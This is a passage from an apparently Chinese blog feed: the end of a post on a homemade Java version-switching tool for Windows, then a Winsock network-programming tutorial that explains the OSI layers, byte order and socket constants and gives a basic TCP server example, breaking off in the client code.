<p>在系统变量的<code>Path</code>变量中新建一个<code>%CLASSPATH%</code></p>
<img src="/2024/11/18/JavaVersionManager/image-20241119112521411.png" alt="image-20241119112521411" style="zoom:50%;">

<p>系统变量的配置就完了。</p>
<h2 id="jvm-exe"><a href="#jvm-exe" class="headerlink" title="jvm.exe"></a>jvm.exe</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>写完JavaVersionManager发现首字母缩写和JavaVirtualMachine一样，不过没关系，用起来感觉也差不多，所以就还是叫jvm吧。</p>
<p>首先使用cmd运行jvm.exe，第一次会出现如下初始化信息：</p>
<p>如果这样就是初始化完成了，初始化时会在<code>C:\User\&lt;your username&gt;</code>这个路径下面产生一个配置文件，JavaVersionManager.ini，不要更改这个文件的内容。被管理的版本会存在这里，如果创建失败可以手动创建</p>
<img src="/2024/11/18/JavaVersionManager/image-20241119113122608.png" alt="image-20241119113122608" style="zoom:50%;">

<img src="/2024/11/18/JavaVersionManager/image-20241119113316339.png" alt="image-20241119113316339" style="zoom:50%;">

<h3 id="配置版本管理器的环境变量"><a href="#配置版本管理器的环境变量" class="headerlink" title="配置版本管理器的环境变量"></a>配置版本管理器的环境变量</h3><p>给jvm.exe配置环境变量</p>
<p>首先将jvm.exe放到一个不碍事的地方，然后配置jvm.exe的环境变量，这样在所有地方就可以用<code>jvm</code>的指令直接运行版本管理器（如下图）。</p>
<img src="/2024/11/18/JavaVersionManager/image-20241119113656591.png" alt="image-20241119113656591" style="zoom:50%;">

<h4 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a>设置方法</h4><p>cmd中运行jvm.exe，使用<code>jvm.exe -set-ev</code>指令自动配置环境变量，配置后后不要更改jvm.exe的程序名。由于配置的是系统环境变量，所以需要确认UAC。</p>
<p>配置好后会出现<code>Environment variable has been set successfully.</code></p>
<p><img src="/2024/11/18/JavaVersionManager/image-20241119113907988.png" alt="image-20241119113907988"></p>
<h3 id="指令说明"><a href="#指令说明" class="headerlink" title="指令说明"></a>指令说明</h3><p><img src="/2024/11/18/JavaVersionManager/image-20241119114012404.png" alt="image-20241119114012404"></p>
<h4 id="set-ev"><a href="#set-ev" class="headerlink" title="-set-ev"></a>-set-ev</h4><p>上面介绍过，用来设置JavaVersionManager自己的环境变量</p>
<h4 id="version"><a href="#version" class="headerlink" title="-version"></a>-version</h4><p>查看JavaVersionManager的版本</p>
<h4 id="versions"><a href="#versions" class="headerlink" title="-versions"></a>-versions</h4><p>相当于<code>java -version</code>，查看当前的Java版本</p>
<h4 id="list"><a href="#list" class="headerlink" title="-list"></a>-list</h4><p>列举被添加到管理器中的jdk版本</p>
<h4 id="add"><a href="#add" class="headerlink" title="-add &lt;path&gt; &lt;describe version&gt;"></a>-add <code>&lt;path&gt; &lt;describe version&gt;</code></h4><p>向管理器中添加jdk版本。</p>
<p><strong>如：</strong><code>add D:\Programming\Java\jkd21 21</code></p>
<h4 id="set-describe-version"><a href="#set-describe-version" class="headerlink" title="-set describe version&gt;"></a>-set <code>describe version&gt;</code></h4><p><strong>如：</strong><code>-set 21</code></p>
<p>这样后会弹出UAC提示，确认后<code>%JAVA_HOME%</code>会改成jdk21的路径，重新启动一个终端，使用<code>java -version</code>查看是否改好了版本</p>
<h4 id="remove"><a href="#remove" class="headerlink" title="-remove &lt;describe version&gt;"></a>-remove <code>&lt;describe version&gt;</code></h4><p><strong>如：</strong>使用<code>-remove 21</code>，可以删除管理器中的版本，<strong>不会删除你下载的jdk！！</strong></p>
<div>
<br>
<br>
<br>
<br>
<br>
<br>
</div>

<p>以后加个直接能下载的功能。。。嗯，以后再说</p>
]]></content>
  </entry>
  <entry>
    <title>网络编程</title>
    <url>/2024/07/05/CInternet/</url>
    <content><![CDATA[<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="网络基础知识"><a href="#网络基础知识" class="headerlink" title="网络基础知识"></a>网络基础知识</h2><h3 id="网络OSI模型"><a href="#网络OSI模型" class="headerlink" title="网络OSI模型"></a>网络OSI模型</h3><p>网络OSI7层模型（Open Systems Interconnection）即开放系统互联。它是由ISO（Internet Organization for Standardization）制定</p>
<p>OSI时网络通讯的一种通用框架，它分为七层</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>层</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>应用层（Application）</td>
</tr>
<tr>
<td>6</td>
<td>表示层（Presentation）</td>
</tr>
<tr>
<td>5</td>
<td>会话层（Session）</td>
</tr>
<tr>
<td>4</td>
<td>传输层（Transport）-&gt;TCP&#x2F;UDP</td>
</tr>
<tr>
<td>3</td>
<td>网络层（NetWork）</td>
</tr>
<tr>
<td>2</td>
<td>数据链路层（Data Link）</td>
</tr>
<tr>
<td>1</td>
<td>物理层（Physical）</td>
</tr>
</tbody></table>
<p>但不是所有网络通信都必须经过这7层模型，比如同一网段下两台计算机的交互，只需要经过物理层和数据链路层就够了。</p>
<p>网络上最重要的就是IP，IP就在网络层。</p>
<span id="more"></span>

<h2 id="Windows-Socket"><a href="#Windows-Socket" class="headerlink" title="Windows Socket"></a>Windows Socket</h2><h3 id="什么是套接字（Socket）"><a href="#什么是套接字（Socket）" class="headerlink" title="什么是套接字（Socket）"></a>什么是套接字（Socket）</h3><p>Socket又称套接字，它是TCP&#x2F;IP网络环境下应用程序与底层通信驱动程序之间运行的开发接口.它可以将应用程序与具体的TCP&#x2F;IP隔离开.使得应用程序不需要了解TCP&#x2F;IP的细节，就能够实现传输。</p>
<h3 id="套接字的服务方式和类型"><a href="#套接字的服务方式和类型" class="headerlink" title="套接字的服务方式和类型"></a>套接字的服务方式和类型</h3><p>根据底层协议的不同，Socket开发接口可以提供面向连接和无连接二种服务方式。</p>
<p>在Socketi通信中，套接字分为3种类型。</p>
<p>1.流式套接字.SOCK_STREAM</p>
<p>流式套接字是面向连接的、提供双向、有序、无重复且无记录边界的数据流服务，适用于处理大量数据，可靠性高，但开销也大。</p>
<p>2.数据报式套接字SOCK_DGRAM</p>
<p>UDP，一般应用在传输音视频文件，容许少量丢包</p>
<p>3.原始套接字</p>
<p>其中SOCK_STREAM、SOCK_DGRAM工作在传输层，SOCK_RAW工作在网络层。</p>
<h3 id="构建WinSock应用程序框架"><a href="#构建WinSock应用程序框架" class="headerlink" title="构建WinSock应用程序框架"></a>构建WinSock应用程序框架</h3><p>WinSock包含了两个主要的版本，即Socket1和winsock2，我们一般使用2<br>在使用时，需要包含如下头文件和lib文件<br>#include &lt;WinSock2.h&gt;<br>#pragma comment(lib,”ws2_32.lib”)</p>
<p>还需要初始化WinSocket<br>Int WSAAPI WSAStartup(WORD wVersionRequested &#x2F;&#x2F;版本号,LPWSADATA IpWSAData);		WSAData结构用于存放返回的Socket数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD wVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);	 <span class="comment">//版本号</span></span><br><span class="line">    WSADATA wsaData;				<span class="comment">// 一个结构体，用来返回数据</span></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(wVersion, &amp;wsaData))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup successed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WSAData，存放Winsock返回的初始化信息：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> &#123;</span></span><br><span class="line">    WORD wVersion;	<span class="comment">// Socket DLL期望用户使用的规范版本</span></span><br><span class="line">    WORD wHighVersion;	<span class="comment">// 可以支持的最高版本</span></span><br><span class="line">    <span class="type">char</span> szDescription[WSADESCRIPTION_LEN+<span class="number">1</span>];	<span class="comment">// 描述字符串</span></span><br><span class="line">    <span class="type">char</span> szSystemStatus[WSASYSSTATUS_LEN+<span class="number">1</span>];	<span class="comment">// 状态字符串</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> iMaxSockets;	<span class="comment">// 套接字的最大编号（WinSock2或稍后的版本忽略了该字段）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> iMaxUdpDg; <span class="comment">// 忽略</span></span><br><span class="line">    <span class="type">char</span> FAR * lpVendorInfo;	<span class="comment">// 废弃</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/CInternet/image-20240708231715068.png" alt="image-20240708231715068"></p>
<h3 id="IP地址的表现形式"><a href="#IP地址的表现形式" class="headerlink" title="IP地址的表现形式"></a>IP地址的表现形式</h3><p>IP地址常用点分法来表示比如192.168.0.1，即4个0-255的整数表示</p>
<p>但是在计算机中不使用点分法来保存IP地址.这样会浪费存诸空间.而且不便于根据IP地址和子网掩码来计算子网信息<br>所以在计算机中使用无符号长整形数来存诸表示IP地址<br>1.网络字节顺序(NetWork Byte Order,NBO)<br>在网络传送中，IP地址被保存为32位的二进制数在低位存储地址中保存数据的高位字节这种存储顺序格式被称为网络字节顺序.数据按照32位的二进制数为一组进行传输。因为采用网络字节顺序，所以数据的传输顺序是由高到低的。<br>在VC中使用In_addr来保存IP地址。 inet_addr和 inet_ntoa</p>
<p>in_addr：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> UCHAR s_b1,s_b2,s_b3,s_b4; &#125; S_un_b;	<span class="comment">//点分法保存</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> USHORT s_w1,s_w2; &#125; S_un_w;			<span class="comment">//分两部分保存</span></span><br><span class="line">        ULONG S_addr;								<span class="comment">//保存为32位</span></span><br><span class="line">    &#125; S_un;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_addr  S_un.S_addr <span class="comment">/* can be used for most tcp &amp; ip code */</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_host  S_un.S_un_b.s_b2    <span class="comment">// host on imp</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_net   S_un.S_un_b.s_b1    <span class="comment">// network</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_imp   S_un.S_un_w.s_w2    <span class="comment">// imp</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_impno S_un.S_un_b.s_b4    <span class="comment">// imp #</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> s_lh    S_un.S_un_b.s_b3    <span class="comment">// logical host</span></span></span><br><span class="line">&#125; IN_ADDR, *PIN_ADDR, FAR *LPIN_ADDR;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/CInternet/image-20240709130551236.png" alt="image-20240709130551236"></p>
<p>2.主机字节顺序(Host Byte Order，HBO)两种格式<br>不同的主机在对IP地址进行存储时使用的格式也不同，所以需要通过下列四个函数<br>来实现主机和网络字节顺序的互转<br>htonl 将主机字节顺序格式IP地址转换成为TCP&#x2F;IP网络字节顺序			Host to Net u_long<br>htons主机转网络u_short型<br>ntohl网络转主机 u_long			Net to Host u_long<br>ntohs网络转主机 u_short</p>
<h3 id="WinSock-TCP-IP连接流程"><a href="#WinSock-TCP-IP连接流程" class="headerlink" title="WinSock TCP&#x2F;IP连接流程"></a>WinSock TCP&#x2F;IP连接流程</h3><table>
<thead>
<tr>
<th>服务端</th>
<th>客户端</th>
</tr>
</thead>
<tbody><tr>
<td>1.建立流式套接字</td>
<td>1.建立流式套接字</td>
</tr>
<tr>
<td>2.套接字：与本地地址绑定</td>
<td></td>
</tr>
<tr>
<td>3.通知TCP服务器准备连接</td>
<td></td>
</tr>
<tr>
<td>4.等待客户端的连接</td>
<td>2.将套接字与远程主机连接</td>
</tr>
<tr>
<td>5.建立连接</td>
<td></td>
</tr>
<tr>
<td>6.在套接字上读写数据</td>
<td>3.在套接字上读写数据</td>
</tr>
<tr>
<td>7.关闭套接字</td>
<td>4.关闭套接字结束对话</td>
</tr>
<tr>
<td>8.关闭最初的套接字，结束服务</td>
<td></td>
</tr>
</tbody></table>
<p><img src="/2024/07/05/CInternet/image-20240709205503926.png" alt="image-20240709205503926"></p>
<p>地址族：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC       0               <span class="comment">// unspecified</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX         1               <span class="comment">// local to host (pipes, portals)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET         2               <span class="comment">// internetwork: UDP, TCP, etc.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IMPLINK      3               <span class="comment">// arpanet imp addresses</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PUP          4               <span class="comment">// pup protocols: e.g. BSP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CHAOS        5               <span class="comment">// mit CHAOS protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NS           6               <span class="comment">// XEROX NS protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX          AF_NS           <span class="comment">// IPX protocols: IPX, SPX, etc.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ISO          7               <span class="comment">// ISO protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_OSI          AF_ISO          <span class="comment">// OSI is ISO</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ECMA         8               <span class="comment">// european computer manufacturers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DATAKIT      9               <span class="comment">// datakit protocols</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CCITT        10              <span class="comment">// CCITT protocols, X.25 etc</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SNA          11              <span class="comment">// IBM SNA</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DECnet       12              <span class="comment">// DECnet</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DLI          13              <span class="comment">// Direct data link interface</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LAT          14              <span class="comment">// LAT</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_HYLINK       15              <span class="comment">// NSC Hyperchannel</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK    16              <span class="comment">// AppleTalk</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETBIOS      17              <span class="comment">// NetBios-style addresses</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_VOICEVIEW    18              <span class="comment">// VoiceView</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_FIREFOX      19              <span class="comment">// Protocols from Firefox</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNKNOWN1     20              <span class="comment">// Somebody is using this!</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BAN          21              <span class="comment">// Banyan</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATM          22              <span class="comment">// Native ATM Services</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET6        23              <span class="comment">// Internetwork Version 6</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CLUSTER      24              <span class="comment">// Microsoft Wolfpack</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_12844        25              <span class="comment">// IEEE 1284.4 WG AF</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IRDA         26              <span class="comment">// IrDA</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETDES       28              <span class="comment">// Network Designers OSI &amp; gateway</span></span></span><br></pre></td></tr></table></figure>

<p>套接字类型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_STREAM     1               <span class="comment">/* stream socket */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_DGRAM      2               <span class="comment">/* datagram socket */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_RAW        3               <span class="comment">/* raw-protocol interface */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_RDM        4               <span class="comment">/* reliably-delivered message */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCK_SEQPACKET  5               <span class="comment">/* sequenced packet stream */</span></span></span><br></pre></td></tr></table></figure>

<p>套接字使用的协议：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_HOPOPTS       = <span class="number">0</span>,  <span class="comment">// IPv6 Hop-by-Hop options</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line">    IPPROTO_ICMP          = <span class="number">1</span>,</span><br><span class="line">    IPPROTO_IGMP          = <span class="number">2</span>,</span><br><span class="line">    IPPROTO_GGP           = <span class="number">3</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_IPV4          = <span class="number">4</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_ST            = <span class="number">5</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line">    IPPROTO_TCP           = <span class="number">6</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_CBT           = <span class="number">7</span>,</span><br><span class="line">    IPPROTO_EGP           = <span class="number">8</span>,</span><br><span class="line">    IPPROTO_IGP           = <span class="number">9</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line">    IPPROTO_PUP           = <span class="number">12</span>,</span><br><span class="line">    IPPROTO_UDP           = <span class="number">17</span>,</span><br><span class="line">    IPPROTO_IDP           = <span class="number">22</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_RDP           = <span class="number">27</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_IPV6          = <span class="number">41</span>, <span class="comment">// IPv6 header</span></span><br><span class="line">    IPPROTO_ROUTING       = <span class="number">43</span>, <span class="comment">// IPv6 Routing header</span></span><br><span class="line">    IPPROTO_FRAGMENT      = <span class="number">44</span>, <span class="comment">// IPv6 fragmentation header</span></span><br><span class="line">    IPPROTO_ESP           = <span class="number">50</span>, <span class="comment">// encapsulating security payload</span></span><br><span class="line">    IPPROTO_AH            = <span class="number">51</span>, <span class="comment">// authentication header</span></span><br><span class="line">    IPPROTO_ICMPV6        = <span class="number">58</span>, <span class="comment">// ICMPv6</span></span><br><span class="line">    IPPROTO_NONE          = <span class="number">59</span>, <span class="comment">// IPv6 no next header</span></span><br><span class="line">    IPPROTO_DSTOPTS       = <span class="number">60</span>, <span class="comment">// IPv6 Destination options</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line"></span><br><span class="line">    IPPROTO_ND            = <span class="number">77</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0501)</span></span><br><span class="line">    IPPROTO_ICLFXBM       = <span class="number">78</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0501)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &gt;= 0x0600)</span></span><br><span class="line">    IPPROTO_PIM           = <span class="number">103</span>,</span><br><span class="line">    IPPROTO_PGM           = <span class="number">113</span>,</span><br><span class="line">    IPPROTO_L2TP          = <span class="number">115</span>,</span><br><span class="line">    IPPROTO_SCTP          = <span class="number">132</span>,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//(_WIN32_WINNT &gt;= 0x0600)</span></span></span><br><span class="line">    IPPROTO_RAW           = <span class="number">255</span>,</span><br><span class="line"></span><br><span class="line">    IPPROTO_MAX           = <span class="number">256</span>,</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  These are reserved for internal use by Windows.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    IPPROTO_RESERVED_RAW  = <span class="number">257</span>,</span><br><span class="line">    IPPROTO_RESERVED_IPSEC  = <span class="number">258</span>,</span><br><span class="line">    IPPROTO_RESERVED_IPSECOFFLOAD  = <span class="number">259</span>,</span><br><span class="line">    IPPROTO_RESERVED_WNV = <span class="number">260</span>,</span><br><span class="line">    IPPROTO_RESERVED_MAX  = <span class="number">261</span></span><br><span class="line">&#125; IPPROTO, *PIPROTO;</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd, new_socket;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(address);</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, <span class="number">3</span>) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接受新连接</span></span><br><span class="line">    <span class="keyword">if</span> ((new_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, &amp;addrlen)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取客户端发送的数据</span></span><br><span class="line">    iResult = recv(new_socket, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">        closesocket(new_socket);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到客户端</span></span><br><span class="line">    send(new_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(new_socket);</span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> 